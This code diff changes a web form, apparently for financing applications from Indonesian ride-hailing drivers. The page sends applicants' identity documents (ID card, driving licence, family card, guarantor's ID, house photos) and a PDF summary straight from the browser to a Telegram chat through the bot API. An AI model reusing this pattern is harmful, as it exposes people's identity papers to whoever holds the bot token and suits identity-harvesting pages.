@@ -346,7 +346,11 @@ document.querySelector('form').addEventListener('submit', async (e) => {
     btn.disabled = true; load.style.display = "block";
 
     try {
-        // 1. BUAT PDF SUMMARY
+        // ============================================
+        // 1. BUAT & KIRIM PDF SUMMARY SECARA TERPISAH
+        // ============================================
+        load.innerText = "📤 Mengirim PDF Data Pemohon...";
+        
         const { jsPDF } = window.jspdf;
         const doc = new jsPDF();
         
@@ -377,9 +381,18 @@ document.querySelector('form').addEventListener('submit', async (e) => {
         const pdfBlob = doc.output('blob');
         const pdfCaption = `🔥 PENGAJUAN BARU: ${namaFull}\nUnit: ${unit}\nOjol: ${ojolString}\nEmail: ${document.getElementById('email').value}`;
 
-        // 2. KUMPULKAN SEMUA FILE KE DALAM ARRAY
+        let pdfFormData = new FormData();
+        pdfFormData.append('chat_id', CHAT_ID);
+        pdfFormData.append('document', pdfBlob, `DATA_${namaFull}.pdf`);
+        pdfFormData.append('caption', pdfCaption);
+
+        // Kirim PDF sendirian
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: pdfFormData });
+
+        // ============================================
+        // 2. KUMPULKAN SEMUA FOTO & JADIKAN ALBUM
+        // ============================================
         let allFiles = [];
-        allFiles.push({ key: 'pdf_summary', blob: pdfBlob, filename: `DATA_${namaFull}.pdf`, caption: pdfCaption });
 
         const docList = [
             { id: 'file_opsional', nama: dokPilihan },
@@ -387,7 +400,7 @@ document.querySelector('form').addEventListener('submit', async (e) => {
             { id: 'ktp', nama: 'KTP' },
             { id: 'sim', nama: 'SIM' },
             { id: 'kk', nama: 'KK' },
-            { id: 'rumah', nama: 'BUKTI BELI TOKEN LISTRIK' },
+            { id: 'rumah', nama: 'BUKTI PEMBELIAN TOKEN ' },
             { id: 'ktp_penjamin', nama: 'KTP PENJAMIN' },
             { id: 'surat_domisili', nama: 'SURAT DOMISILI' },
             { id: 'foto_rumah_depan', nama: 'FOTO RUMAH DEPAN' },
@@ -408,13 +421,13 @@ document.querySelector('form').addEventListener('submit', async (e) => {
             }
         }
 
-        // 3. PECAH DAN KIRIM SEBAGAI MEDIA GROUP (ALBUM) MAKSIMAL 10 FILE
+        // 3. PECAH DAN KIRIM SEBAGAI MEDIA GROUP (ALBUM FOTO MAKSIMAL 10 FILE PER ALBUM)
         const chunkSize = 10;
         const totalChunks = Math.ceil(allFiles.length / chunkSize);
 
         for (let i = 0; i < allFiles.length; i += chunkSize) {
             let currentChunk = allFiles.slice(i, i + chunkSize);
-            load.innerText = `📤 Mengirim Album Berkas ${Math.ceil((i + 1) / chunkSize)} dari ${totalChunks}...`;
+            load.innerText = `📤 Mengirim Album Foto ${Math.ceil((i + 1) / chunkSize)} dari ${totalChunks}...`;
 
             let formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -429,7 +442,9 @@ document.querySelector('form').addEventListener('submit', async (e) => {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: 'POST', body: formData });
         }
 
+        // ============================================
         // 4. MUNCULKAN HALAMAN SUKSES
+        // ============================================
         document.getElementById('mainFormArea').style.display = "none";
         document.getElementById('successArea').style.display = "block";
         window.scrollTo(0,0);
